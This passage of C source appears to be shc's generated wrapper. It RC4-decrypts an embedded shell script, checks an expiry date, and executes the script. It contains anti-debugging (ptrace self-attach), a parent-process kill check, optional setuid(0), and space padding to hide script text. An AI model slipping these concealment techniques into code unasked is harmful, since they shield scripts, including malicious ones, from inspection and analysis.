        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif /* HARDENING */

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) /* New replacement for PT_ATTACH */
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       /* Seccomp Sandboxing - Start */
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
